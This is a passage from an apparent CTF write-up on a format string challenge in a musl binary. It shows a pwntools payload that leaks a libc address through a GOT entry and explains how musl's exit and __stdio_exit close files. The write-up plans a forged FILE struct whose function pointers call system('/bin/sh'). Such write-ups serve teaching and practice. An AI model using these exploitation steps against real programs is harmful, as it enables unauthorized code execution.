correspond to the value on the stack at offset 5.</p><p>With that out of the way, first things first we need to find the offset of our input buffer, as standard for most format string vulnerabilities.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./chall_patched
</span></span><span style=display:flex><span>AAAAAAAA%p%p%p%p%p%p
</span></span><span style=display:flex><span>AAAAAAAA00x140x5d0x7ffd12e35bb000x4141414141414141
</span></span><span style=display:flex><span>Where:
</span></span></code></pre></div><p>We find that our buffer sits at offset 6. With this in mind, we can craft the final format string. As mentioned before, we&rsquo;ll send in a GOT entry along with a <code>%s</code> format at the right offset to leak a libc address.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%p%p%p%p%p%p%p%p|</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>24</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;.&#39;</span>),
</span></span><span style=display:flex><span>    exe<span style=color:#f92672>.</span>got[<span style=color:#e6db74>&#39;putchar&#39;</span>],
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendline(payload)
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;|&#39;</span>)
</span></span><span style=display:flex><span>libc_leak <span style=color:#f92672>=</span> u64(io<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>6</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
</span></span></code></pre></td></tr></table></div></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;/home/nouxia/ctf/arkavidia/pwn/www-0/chall_patched&#39;</span>: pid <span style=color:#ae81ff>186020</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> hex<span style=color:#f92672>(</span>libc_leak<span style=color:#f92672>)</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0x70383b2f8418&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Switching to interactive mode
</span></span><span style=display:flex><span>.....<span style=color:#ae81ff>\x</span>a0?@
</span></span><span style=display:flex><span>Where: $
</span></span></code></pre></div><pre tabindex=0><code>pwndbg&gt; vmmap 0x7914c2902418
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7914c28a0000     0x7914c28b4000 r--p    14000      0 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1
►   0x7914c28b4000     0x7914c290b000 r-xp    57000  14000 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1 +0x4e418
    0x7914c290b000     0x7914c2941000 r--p    36000  6b000 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1
pwndbg&gt; distance 0x7914c2902418 0x7914c28a0000
0x7914c2902418-&gt;0x7914c28a0000 is -0x62418 bytes (-0xc483 words)
pwndbg&gt;
</code></pre><p>Awesome, we now have obtained the libc base address. Moving on, let&rsquo;s explore what we can do with an 8-byte overwrite. Notice how after the program writes our 8 bytes, it immediately calls <code>exit(0)</code>. So let&rsquo;s start there. Let&rsquo;s explore what actually happens when a program calls <code>exit</code>.</p><h2 id=what-happens-when-exit-is-called>What Happens when <code>exit()</code> is Called?<a hidden class=anchor aria-hidden=true href=#what-happens-when-exit-is-called>#</a></h2><p>To answer this question, let&rsquo;s take a look at the musl source code. To provide context for the next section, our final plan will revolve around crafting a fake <a href=https://github.com/kraj/musl/blob/kraj/master/src/internal/stdio_impl.h><code>FILE</code> struct</a>, such that <code>system("/bin/sh")</code> will be called when that file is closed.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// File: src/exit/exit.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdint.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;libc.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;pthread_impl.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;atomic.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;syscall.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>_Noreturn <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>exit</span>(<span style=color:#66d9ef>int</span> code)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#75715e>/* Handle potentially concurrent or recursive calls to exit,
</span></span></span><span style=display:flex><span><span style=color:#75715e>	 * whose behaviors have traditionally been undefined by the
</span></span></span><span style=display:flex><span><span style=color:#75715e>	 * standards. Using a custom lock here avoids pulling in lock
</span></span></span><span style=display:flex><span><span style=color:#75715e>	 * machinery and lets us trap recursive calls while supporting
</span></span></span><span style=display:flex><span><span style=color:#75715e>	 * multiple threads contending to be the one to exit(). */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>static</span> <span style=color:#66d9ef>volatile</span> <span style=color:#66d9ef>int</span> exit_lock[<span style=color:#ae81ff>1</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> tid <span style=color:#f92672>=</span>  <span style=color:#a6e22e>__pthread_self</span>()<span style=color:#f92672>-&gt;</span>tid;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> prev <span style=color:#f92672>=</span> <span style=color:#a6e22e>a_cas</span>(exit_lock, <span style=color:#ae81ff>0</span>, tid);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (prev <span style=color:#f92672>==</span> tid) <span style=color:#a6e22e>a_crash</span>();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (prev) <span style=color:#66d9ef>for</span> (;;) <span style=color:#a6e22e>__sys_pause</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>__funcs_on_exit</span>();
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>__libc_exit_fini</span>();
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>__stdio_exit</span>();
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>_Exit</span>(code);
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>There are 3 functions that can be of our interest here, <code>__funcs_on_exit</code>, <code>__libc_exit_fini</code>, and <code>__stdio_exit</code>. However, so this post doesn&rsquo;t become too long, I&rsquo;ll only be talking about <code>__stdio_exit</code>, which is be the function we&rsquo;ll be taking advantage of for our exploit. But as a general overview, <code>__funcs_on_exit</code> is where the functions registered by <code>atexit</code> will be called, and <code>__libc_exit_fini</code> is equivalent to <code>_dl_fini</code> on glibc. Below is the source code for <code>__stdio_exit</code> and <code>__ofl_lock</code>, one of the functions called within it.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// File: src/stdio/ofl.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;stdio_impl.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;lock.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;fork_impl.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> FILE <span style=color:#f92672>*</span>ofl_head;
</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>volatile</span> <span style=color:#66d9ef>int</span> ofl_lock[<span style=color:#ae81ff>1</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>volatile</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span><span style=color:#66d9ef>const</span> __stdio_ofl_lockptr <span style=color:#f92672>=</span> ofl_lock;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>FILE <span style=color:#f92672>**</span><span style=color:#a6e22e>__ofl_lock</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>LOCK</span>(ofl_lock);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#f92672>&amp;</span>ofl_head;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// File: src/stdio/__stdio_exit.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;stdio_impl.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> FILE <span style=color:#f92672>*</span><span style=color:#66d9ef>volatile</span> dummy_file <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>weak_alias</span>(dummy_file, __stdin_used);
</span></span><span style=display:flex><span><span style=color:#a6e22e>weak_alias</span>(dummy_file, __stdout_used);
</span></span><span style=display:flex><span><span style=color:#a6e22e>weak_alias</span>(dummy_file, __stderr_used);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>close_file</span>(FILE <span style=color:#f92672>*</span>f)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>f) <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>FFINALLOCK</span>(f);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (f<span style=color:#f92672>-&gt;</span>wpos <span style=color:#f92672>!=</span> f<span style=color:#f92672>-&gt;</span>wbase) f<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>write</span>(f, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (f<span style=color:#f92672>-&gt;</span>rpos <span style=color:#f92672>!=</span> f<span style=color:#f92672>-&gt;</span>rend) f<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>seek</span>(f, f<span style=color:#f92672>-&gt;</span>rpos<span style=color:#f92672>-</span>f<span style=color:#f92672>-&gt;</span>rend, SEEK_CUR);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>__stdio_exit</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	FILE <span style=color:#f92672>*</span>f;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (f<span style=color:#f92672>=*</span><span style=color:#a6e22e>__ofl_lock</span>(); f; f<span style=color:#f92672>=</span>f<span style=color:#f92672>-&gt;</span>next) <span style=color:#a6e22e>close_file</span>(f);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>close_file</span>(__stdin_used);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>close_file</span>(__stdout_used);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>close_file</span>(__stderr_used);
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>The function <code>__stdio_exit</code> is responsible for closing all open <code>FILE</code> handles. Furthermore, <code>__ofl_lock</code> will return the head of the linked list containing all open <code>FILE</code> handles, similar to <code>_IO_list_all</code> in glibc. After that, each <code>FILE</code> in the list will be closed one by one followed by <code>stdin</code>, <code>stdout</code>, and <code>stderr</code>.</p><p>The key thing to observe here is the calls to <code>f->write</code> and <code>f->seek</code> in <code>close_file</code>. The <code>write</code> and <code>seek</code> members of the <code>FILE</code> struct are overwritable pointers. So, if we can insert a pointer to <code>system</code> into either <code>write</code> or <code>seek</code>, we will successfully call <code>system</code> when that <code>FILE</code> is closed. However, we need to ensure that <code>f->wpos != f->wbase</code> or <code>f->rpos != f->rend</code> so that the function will be called. To find out the needed offsets in the <code>FILE</code> struct, let&rsquo;s take a look at the disassembly of <code>close_file</code>.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>pwndbg</span><span style=color:#960050;background-color:#1e0010>&gt;</span> <span style=color:#66d9ef>x</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#ae81ff>30</span><span style=color:#66d9ef>i</span> <span style=color:#ae81ff>0x7ffff7fb829a</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x7ffff7fb829a:      <span style=color:#a6e22e>test</span>   <span style=color:#66d9ef>rdi</span>,<span style=color:#66d9ef>rdi</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x7ffff7fb829d:      <span style=color:#a6e22e>je</span>     <span style=color:#ae81ff>0x7ffff7fb82e9</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x7ffff7fb829f:      <span style=color:#a6e22e>push</span>   <span style=color:#66d9ef>rbx</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x7ffff7fb82a0:      <span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>eax</span>,<span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>rdi</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>0x8c</span>]
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x7ffff7fb82a6:      <span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>rbx</span>,<span style=color:#66d9ef>rdi</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x7ffff7fb82a9:      <span style=color:#a6e22e>test</span>   <span style=color:#66d9ef>eax</span>,<span style=color:#66d9ef>eax</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x7ffff7fb82ab:      <span style=color:#a6e22e>jns</span>    <span style=color:#ae81ff>0x7ffff7fb82e0</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x7ffff7fb82ad:      <span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>rax</span>,<span style=color:#66d9ef>QWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>rbx</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>0x38</span>]
